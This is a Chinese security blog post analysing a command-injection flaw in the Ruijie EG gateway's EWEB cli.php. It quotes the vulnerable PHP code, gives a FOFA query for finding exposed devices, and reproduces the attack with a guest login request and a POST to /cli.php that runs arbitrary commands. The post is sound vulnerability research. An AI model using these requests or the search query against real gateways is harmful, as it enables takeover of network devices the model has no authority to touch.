---
title: "锐捷-EWEB cli.php 命令注入漏洞"
source: https://mrxn.net/jswz/ruijieweb-cli-rce.html
asset_dir: assets/锐捷-eweb-cli.php-命令注入漏洞
---

# 锐捷-EWEB cli.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/2 08:25
* 836浏览
* [0评论](#comment)
* 21分钟阅读

深入探索

路由器

SQL

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `cli.php` 的 `indexAction`存在[命令注入](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)在设备上执行任意命令，造成设备失陷等高危风险。

代码安全审计

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `cli.php` 关键业务 `indexAction` 逻辑的实现

深入探索

身份验证

恶意软件分析工具

防火墙软件

```
public function indexAction() {
        $mode = p("mode_url");
        $command = p("command");
        $answer = p("answer");

        if ($mode == false)
            $mode = "exec";
        if ($answer == false)
            $answer = "";
        if ($command !== false)
            $command = iconv('UTF-8', 'GBK//IGNORE', $command);
        $data = execCli($mode, $command, $answer);
        if ($data["status"] !== 1) {
            json_echo($data);
            exit();
        }
```

深入探索

Windows安全工具

Web安全课程

编码转换工具

`mode_url` 、`command` 和 `answer` 带入 `execCli` 方法中，跟进看下其实现

漏洞扫描服务

```
function execCli($mode = "exec", $command = "", $answer = "") {
    $data = [];
    if ($command == "" || $command == false) {
        $data["status"] = 2;
        $data["msg"] = "no command";
        return $data;
    }
    if (!function_exists('php_exec_cli')) {  //动态加载cli通信模块
        if (!@dl('client.so')) {
            $data["status"] = 3;
            $data["msg"] = "can't load client.so";
            return $data;
        }
    }
    if (defined('DEBUG') && DEBUG) {
        $t1 = microtime(true);
    }
    $data["data"] = php_exec_cli($command, $mode, $answer);
    $data["status"] = 1;
    if (defined('DEBUG') && DEBUG) {
        $t2 = microtime(true);
        $data["executeTime"] = ($t2 - $t1) * 1000;
    }
    return $data;
}
```

根据 `$command` 是否为空，然后来调用 `php_exec_cli` 执行命令，全程无过滤和检测，因此造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB cli.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 命令注入

```
POST /cli.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

command=dir&mode_url=0
```

[![锐捷-EWEB cli.php 命令注入漏洞](images/img-002-1b0bd90b140e.webp)](https://image.mrxn.net/2f1e3d9c57184b01bf47eac923e77a3b.webp)

成功执行 `dir` 命令并回显结果。

漏洞扫描服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.获取cookie](#toc-5-1-)
* [5.2.命令注入](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB cli.php 命令注入漏洞](https://mrxn.net/jswz/ruijieweb-cli-rce.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-cli-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-cli-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-cli-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
